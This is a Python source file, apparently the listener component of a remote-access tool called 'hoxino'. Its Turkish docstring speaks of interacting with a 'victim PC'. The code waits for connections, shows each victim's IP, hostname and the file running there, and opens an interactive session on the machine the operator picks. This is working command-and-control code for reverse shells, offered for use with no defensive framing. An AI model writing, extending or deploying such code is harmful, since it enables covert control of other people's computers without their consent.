"""
Burasi thread olacak.Baglanti ile etkilesime gecildiginde bile, burasi calismali.
Port dinlenir.Port'a gelecek herhangi bir baglanti objesi ve adresi ekrana verilecek ve
bir liste degiskeninde tutulacak.
Kullanici bir sekilde port dinlenmesini sonlandiricak.Bundan sonra kullanicidan bir input istenecek.
Input'a verilen deger ile, kullanicinin etkilesime gececegi baglanti belirlenecek.Belirlendikten
sonra, kullanici kurban pc ile etkilesime gececegi terminal acilir.
Hangi program olarak yer aldigi yazacak listingte.
"""

import socket
from module import hoxino_server
from colorama import init, Fore
from halo import Halo
import os
import sys

init()

connections = []
addrs = []


def listen_port(ip, port):
    index = 1    
    client_list = f"{Fore.LIGHTGREEN_EX}当前连接的客户端\n---------------\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((ip, port))
        s.listen()
        spinner = Halo(text=f"正在监听 {ip}:{port}，按 CTRL+C 停止。", spinner="line", placement="right", color="green", text_color="green")
        spinner.start()
        while True:
            try:
                connection, addr = s.accept()
                connections.append(connection)
                addrs.append(addr)
                # 使用UTF-8编码接收数据
                host_name_with_abs_path = connection.recv(4096).decode('utf-8', errors='replace')
                delimiter = host_name_with_abs_path.split(":delimiter:")
                client_list = client_list + f"{Fore.GREEN}[{Fore.LIGHTGREEN_EX}{index}{Fore.GREEN}]客户端IP:{addr[0]} 端口:{addr[1]} 主机名:{delimiter[0]} 运行文件:{delimiter[1]}\n"
                print(f"""
{Fore.LIGHTGREEN_EX}[已建立连接]{Fore.BLUE}客户端IP:{addr[0]} 端口:{addr[1]} 主机名:{delimiter[0]} 运行文件:{delimiter[1]}""")
                index = index + 1
                if os.name == "nt":
                    sys.stdin.read()
            except KeyboardInterrupt:
                try:
                    if connections == []:
                        print(f"\n{Fore.RED}[-]没有已建立的连接。")
                        return 0
                    spinner.succeed("监听已停止。")
                    os.system("cls" if os.name == "nt" else "clear")
                    print(client_list)
                    try:
                        client_choice = int(input(f"{Fore.CYAN}输入要交互的客户端编号:"))
                        if client_choice >= index or client_choice < 1:
                            print(f"{Fore.RED}[-]请输入有效的编号。")
                            for i in range(0, (index - 1)):
                                connections[i].send("exit".encode('utf-8'))
                            return 0
                        client_choice = client_choice - 1
                        for i in range(0, (index - 1)):
                            if i == client_choice:
                                continue
                            else:
                                connections[i].send("exit".encode('utf-8'))
                    except ValueError:
                        print(f"{Fore.RED}[-]请输入数字。")
                        for i in range(0, (index - 1)):
                            connections[i].send("exit".encode('utf-8'))
                        return 0
                except KeyboardInterrupt:
                    for i in range(0, (index - 1)):
                        connections[i].send("exit".encode('utf-8'))
                    return 0
                server = hoxino_server.Server(connections[client_choice], addrs[client_choice], delimiter[0], delimiter[2])
                print(f"{Fore.LIGHTGREEN_EX}[!]已连接到 {addrs[client_choice][0]}:{addrs[client_choice][1]}!")
                server.main()
                return 0
    except Exception as e:
        print(f"{Fore.RED}[-]端口监听失败: {str(e)}")
        print(f"{Fore.RED}[-]请确保输入了有效的IP地址和端口。")
        return 0
        